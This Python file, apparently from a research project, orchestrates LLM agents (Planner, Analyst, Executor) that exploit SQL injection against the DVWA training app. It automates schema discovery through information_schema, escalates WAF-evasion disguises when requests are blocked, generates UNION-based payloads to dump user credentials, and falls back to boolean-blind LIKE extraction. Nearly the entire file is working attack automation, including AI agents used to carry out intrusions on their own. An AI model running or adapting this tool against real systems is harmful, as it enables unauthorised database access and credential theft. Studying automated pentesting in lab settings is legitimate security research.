"""Orchestrator: coordina a los tres agentes para explotar una SQL injection SIN conocer el esquema.

Flujo (como un pentester real, todo averiguado por comandos, nada hardcodeado):
  1. Login y fijar el nivel de seguridad.
  2. El Planner plantea la metodología (UNION-based sobre MySQL), sin asumir tablas ni columnas.
  3. El descubrimiento (determinista + evasión de WAF) averigua: contexto de comillas, nº de
     columnas, columnas reflejadas, tablas y columnas — vía ORDER BY e information_schema.
  4. El Analyst decide cuáles columnas descubiertas son usuario/contraseña.
  5. El Executor GENERA el payload de extracción desde ese esquema (con respaldo determinista).
  6. Se extraen las credenciales. Se mide el tiempo hasta la explotación (métrica del estudio)."""
from __future__ import annotations

import time
from typing import Callable, Optional

from . import knowledge
from .agents import Analyst, Executor, Planner
from .blind import BlindExtractor
from .discovery import ProbeResult, SchemaDiscovery, pick_credential_columns
from .dvwa import DVWAClient
from .evasion import EvasionEngine
from .llm import OllamaClient
from .types import RunResult

Logger = Optional[Callable[[str], None]]


def _valid_dump(crafted: dict, table: str, cred_columns: tuple[str, str]) -> bool:
    """Valida el payload que generó el LLM; si no sirve, se usa el determinista."""
    p = str(crafted.get("payload", "")).strip().lower()
    if not p:
        return False
    u, pw = cred_columns[0].lower(), cred_columns[1].lower()
    return "union" in p and "select" in p and table.lower() in p and u in p and pw in p


class Orchestrator:
    def __init__(self, llm: OllamaClient, dvwa: DVWAClient) -> None:
        self.dvwa = dvwa
        self.planner = Planner("Planner", "planner.md", llm)
        self.executor = Executor("Executor", "executor.md", llm)
        self.analyst = Analyst("Analyst", "analyst.md", llm)

    def run(
        self,
        level: str,
        max_steps: int,
        timeout_seconds: int,
        log: Logger = None,
    ) -> RunResult:
        say = log or (lambda _msg: None)
        start = time.monotonic()
        deadline = start + timeout_seconds

        if not self.dvwa.login():
            raise RuntimeError("DVWA login failed — check the URL and credentials in config.py")
        self.dvwa.set_security(level)
        say(f"[Orchestrator] login ok, nivel de seguridad '{level}'")

        engine = EvasionEngine()
        counter = {"steps": 0}
        payload_log: list[dict] = []   # cada payload que se envía, con su estado (para auditar/exportar)

        def probe(base_sql: str) -> ProbeResult:
            # Envío consciente del WAF: escala disfraces hasta que uno pasa (o se agota la escalera).
            while True:
                if counter["steps"] >= max_steps or time.monotonic() > deadline:
                    return ProbeResult(blocked=True)
                payload, pipeline = engine.next_payload(base_sql)
                if payload is None:
                    return ProbeResult(blocked=True)
                counter["steps"] += 1
                resp = self.dvwa.run_sqli(payload, level)
                payload_log.append({"payload": payload, "phase": "descubrimiento",
                                    "blocked": resp.blocked, "http_status": resp.http_status})
                if resp.blocked:
                    say(f"[WAF] bloqueó (HTTP {resp.http_status}) — escalando evasión")
                    engine.record(pipeline, payload, blocked=True)
                    continue
                engine.record(pipeline, payload, blocked=False)
                cells = [[r.get("first_name", ""), r.get("surname", "")] for r in resp.rows]
                return ProbeResult(cells=cells, db_error=resp.db_error, blocked=False)

        # El Planner plantea la metodología (no asume esquema).
        strategy = str(self.planner.plan(level).get("strategy", ""))
        say(f"[Planner] {strategy}")

        # El Analyst elige las columnas de credenciales; si falla, respaldo determinista.
        def pick(table: str, columns: list[str]) -> Optional[tuple[str, str]]:
            picked = self.analyst.pick_credentials(table, columns)
            if picked and picked[0] in columns and picked[1] in columns:
                say(f"[Analyst] credenciales en {table!r}: {picked}")
                return picked
            return pick_credential_columns(table, columns)

        # Descubrir el esquema por comandos (ORDER BY, information_schema).
        discovery = SchemaDiscovery(probe, say=say, pick=pick)
        res = discovery.discover()

        extracted: list[dict[str, str]] = []
        success = False
        if res.cred_columns[0]:
            # El Executor GENERA el payload desde el esquema descubierto; se valida y hay respaldo.
            crafted = self.executor.craft_dump(
                res.quote, res.columns, res.reflected, res.target_table, res.cred_columns
            )
            template = discovery.build_dump_payload(res)
            payload = str(crafted.get("payload", "")).strip() if _valid_dump(
                crafted, res.target_table, res.cred_columns
            ) else template
            say(f"[Executor] payload de extracción: {payload!r}")
            extracted = discovery.extract(payload, res)
            success = bool(extracted)
            if success:
                conf = "verificada" if res.verified else "sin verificar"
                say(f"[Orchestrator] SUCCESS — {len(extracted)} credenciales extraídas "
                    f"(DBMS={res.dbms or '?'}, confirmada por {res.techniques}, extracción {conf})")
        if not success:
            # Fallback boolean-blind: si UNION está bloqueado pero el booleano pasa (p. ej. NAXSI
            # bloquea UNION/SELECT pero deja LIKE), extrae carácter por carácter con LIKE.
            blind = self._blind_fallback(engine, level, deadline, counter, say, payload_log)
            if blind:
                extracted, success = [blind], True
                res.trace.append(f"extracción boolean-blind (LIKE): {blind}")
        if not success:
            say("[Orchestrator] FAILED — no se extrajeron credenciales")

        elapsed = time.monotonic() - start
        return RunResult(
            level=level,
            success=success,
            elapsed_seconds=round(elapsed, 2),
            steps_used=counter["steps"],
            extracted=extracted,
            strategy=strategy,
            trace=res.trace,
            waf_profile=engine.profile.summary(),
            payloads=payload_log,
        )

    def _blind_fallback(self, engine, level, deadline, counter, say, payload_log):
        """Extracción boolean-blind con LIKE cuando UNION está bloqueado pero el booleano pasa."""
        def oracle(payload: str) -> bool:
            while time.monotonic() < deadline:
                p, pipe = engine.next_payload(payload)
                if p is None:
                    return False
                counter["steps"] += 1
                resp = self.dvwa.run_sqli(p, level)
                payload_log.append({"payload": p, "phase": "blind",
                                    "blocked": resp.blocked, "http_status": resp.http_status})
                if resp.blocked:
                    engine.record(pipe, p, blocked=True)
                    continue
                engine.record(pipe, p, blocked=False)
                return bool(resp.rows)
            return False

        candidates: Optional[tuple[list[str], list[str]]] = None
        for quote in ("", "'"):   # medium = entero (sin comilla); otros = cadena
            bx = BlindExtractor(oracle, quote=quote, say=say)
            if not bx.confirm():
                continue
            say(f"[Blind] inyección booleana confirmada (comillas={quote!r}); "
                f"UNION bloqueado → extracción ciega con LIKE")
            # Candidatos de columna: el Analyst (LLM) los propone y sqlmap los aterriza (una vez).
            if candidates is None:
                candidates = self._credential_candidates(say)
            bx.user_cols, bx.pass_cols = candidates
            row = bx.dump_first_row()
            if row and row.get("hash"):
                say(f"[Orchestrator] SUCCESS (boolean-blind, {bx.requests} sondeos) — {row}")
                return row
            return None
        return None

    def _credential_candidates(self, say: Logger) -> tuple[list[str], list[str]]:
        """Nombres de columnas de credencial para la ruta ciega: el Analyst (LLM) los PROPONE y se
        ATERRIZAN en la wordlist de sqlmap (solo nombres reales van primero). Respaldo determinista
        si el LLM no responde."""
        try:
            users, passwords = self.analyst.guess_credential_columns()
        except Exception:
            users, passwords = [], []
        wl = {c.lower() for c in knowledge.common_columns()}
        def ground(names: list[str]) -> list[str]:
            inwl = [n for n in names if n.lower() in wl]      # nombres del LLM que existen en sqlmap
            extra = [n for n in names if n.lower() not in wl]  # el resto de lo propuesto por el LLM
            return inwl + extra
        users, passwords = ground(users), ground(passwords)
        if users and passwords:
            say(f"[Blind] columnas propuestas por el Analyst (LLM), aterrizadas en sqlmap: "
                f"usuario≈{users[:4]} password≈{passwords[:4]}")
            return users, passwords
        # Respaldo determinista: wordlist de sqlmap (o lista mínima si falta el dataset).
        fu, fp = knowledge.credential_column_candidates()
        say("[Blind] Analyst sin respuesta → respaldo determinista (wordlist de sqlmap)")
        return (users or fu), (passwords or fp)
